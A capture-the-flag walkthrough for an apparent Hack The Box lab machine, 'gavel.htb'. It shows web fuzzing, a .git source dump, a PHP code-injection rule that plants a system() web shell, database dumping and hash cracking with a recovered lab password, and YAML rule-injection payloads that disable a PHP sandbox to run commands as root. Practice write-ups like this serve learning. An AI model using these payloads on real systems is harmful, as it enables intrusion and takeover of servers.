First I noticed the box uses a virtual host, so I added it to my hosts file with:

```bash echo "10.129.148.142 gavel.htb" | sudo tee -a /etc/hosts ```

Then I fuzzed the site using ffuf:

```bash ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://gavel.htb/FUZZ ​```

This revealed a few interesting directories: /assets, /rules, and /includes.
The assets folder had an SB Admin 2 dashboard (so yeah, jQuery and all that).
There was also an items.json file listing every item available on the platform.
Rules and includes just gave 401 errors.

I scanned for PHP files and found:
```
index.php
login.php
register.php
admin.php
inventory.php
```
So the whole site runs on PHP.

I tried brute forcing login and discovered the username ```"auctioneer"```, but still didn’t have the password.

While placing a bid, the POST body contained:

```text bid_amount auction_id ​```

Inside the inventory section, sorting items showed that my ```user_id = 2.```
Manually changing it did nothing → no IDOR.

SQLMap on auction_id didn't reveal anything.
Accessing admin.php redirected to index.php → role check.

Later I found a .git folder exposed on the web server and dumped it:

```bash git-dumper http://gavel.htb/.git/ ./gavel-git ​```

Inside the dumped source, the most important part was:

```
php $rule = $auction["rule"];
runkit_function_add("ruleCheck", "$current_bid, $previous_bid, $bidder", $rule);
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```
This means arbitrary PHP execution by editing auction rules.

Inside the admin panel, I added the following malicious rule:

```php file_put_contents("../assets/shell.php", "<?php system(\$_GET['cmd']); ?>"); return true; ​```

Then I placed a bid → rule executed → shell created.

Visited:

```/assets/shell.php?cmd=id ​```

Got a shell as www-data.

Dumped the database:

```bash mysql -ugavel -pgavel -e "USE gavel; SELECT * FROM users;" ​```

Cracked the auctioneer hash using rockyou:

```bash hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force ​```

Password was:

> midnight1 ​

Switched to auctioneer → got user flag.

Privilege Escalation

The root daemon processes YAML files and executes the rule field via restricted PHP.
To break the sandbox, I made a YAML that overwrites php.ini:

```yaml name: x price: 1 description: x image: x rule_msg: x rule: return false;} file_put_contents('/opt/gavel/.config/php/php.ini', "'"); // ```​

Submitted it:

```bash gavel-util submit /tmp/root.yaml ​```

Now the sandbox was disabled.

Tested RCE as root:

```yaml name: x price: 1 description: x image: x rule_msg: test rule: return false;} system('whoami > /tmp/rootcheck'); // ​```

Finally read the root flag:

```yaml name: x price: 1 description: x image: x rule_msg: readflag rule: return false;} copy('/root/root.txt', '/opt/gavel/rooted.txt'); // ​```

```bash gavel-util submit /tmp/readflag.yaml```
```cat /opt/gavel/rooted.txt ​```
